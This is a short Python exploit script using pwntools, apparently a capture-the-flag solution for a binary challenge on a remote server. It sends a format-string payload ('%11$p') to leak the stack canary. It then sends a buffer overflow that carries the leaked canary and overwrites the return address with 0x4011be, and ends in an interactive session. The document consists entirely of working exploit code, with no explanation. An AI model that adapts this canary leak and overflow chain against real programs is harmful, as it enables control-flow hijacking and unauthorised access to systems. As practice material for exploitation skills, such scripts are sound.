from pwn import *

isremote = True
if isremote:
    r = remote("23.146.248.233", 20002)
else:
    r = process("./src/chal")

buffer_address = int(r.recvline().split()[3], 16)
print("Buffer addr:" + str(hex(buffer_address)))
r.recvuntil("What do you want to say:")
raw_input('>')

leak_canary = "%11$p"
r.sendline(leak_canary)

canary = int(r.recv(0x12), 16)

print("Canary:" + str(hex(canary)))

r.recvuntil("Do you still have anything to say:")
r.sendline('a'*(0x30-8) + p64(canary) + p64(0xdeadbeef) + p64(0x4011be))

r.interactive()
